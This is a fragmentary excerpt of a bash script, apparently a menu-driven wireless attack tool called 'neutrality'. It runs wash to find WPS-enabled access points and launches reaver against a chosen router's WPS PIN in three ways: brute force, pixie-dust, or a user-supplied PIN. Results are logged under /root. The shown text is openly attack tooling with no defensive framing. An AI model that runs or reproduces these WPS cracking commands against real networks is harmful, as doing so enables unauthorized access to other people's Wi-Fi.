...
export WLANNM
SCW=1
function defaults_neutralityh3
{
#path for neutrality
...
function scan_wash
{
	...
	then
		...
		sleep 1
		xterm -geometry 80x25+9999+9999 -T "Press Ctrl C when ready" -e "wash  -i $WLANNM | tee /root/neutrality/tempwash "
	fi
		SCW=1
		clear
		wash_awk
...
function reaver_attack
{
	...
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -d $DELAY -L -f -N -vvv | tee /root/neutrality/wpslog
...
function pixie_attack
{
	...
	reaver -i $WLANNM -b $BSSIDT -c $CHANT -N -f --pixie-dust -vvv | tee /root/neutrality/wpslog
	echo -e "Press "$YS"enter"$CE" to go back"
	read
}
...
then
	...
	then
		...
		read -e WPST
		clear
		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/neutrality/wpslog
		echo -e "Press "$YS"enter"$CE" to go back"
		read
	else
		echo -e ""$RS"No network selected"$CE""
